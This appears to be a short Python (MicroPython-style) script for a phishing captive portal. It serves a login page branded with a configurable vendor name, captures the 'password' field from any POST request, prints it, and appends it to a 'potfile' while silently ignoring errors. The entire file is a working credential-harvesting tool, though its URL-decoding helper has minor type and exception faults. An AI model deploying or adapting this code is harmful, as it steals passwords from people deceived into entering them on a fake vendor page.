from config import config

resp = """HTTP/1.1 200 OK
Content-Type: text/html
Connection: close


"""

with open('index.html') as f:
    resp += f.read()

resp = resp.replace("VENDOR", config["vendor"])


async def run(reader, writer):
    request_line = (await reader.readline()).decode()
    try:
        body = await reader.read(-1)
        await writer.awrite(resp)
        if request_line.startswith('POST'):
            body = body[body.index(b'password=')+9:]
            body = body[:body.index(b'&')]
            password = unquote(body.decode())
            print(password)
            with open('potfile', 'a') as f:
                f.write(password+'\n')
    except:
        pass
    await writer.aclose()


def unquote(string):
    """unquote('abc%20def') -> b'abc def'.

    Note: if the input is a str instance it is encoded as UTF-8.
    This is only an issue if it contains unescaped non-ASCII characters,
    which URIs should not.
    """
    if not string:
        return b''

    if isinstance(string, str):
        string = string.encode('utf-8')

    bits = string.split(b'%')
    if len(bits) == 1:
        return string

    res = bytearray(bits[0])
    append = res.append
    extend = res.extend

    for item in bits[1:]:
        try:
            append(int(item[:2], 16))
            extend(item[2:])
        except KeyError:
            append(b'%')
            extend(item)

    return bytes(res)
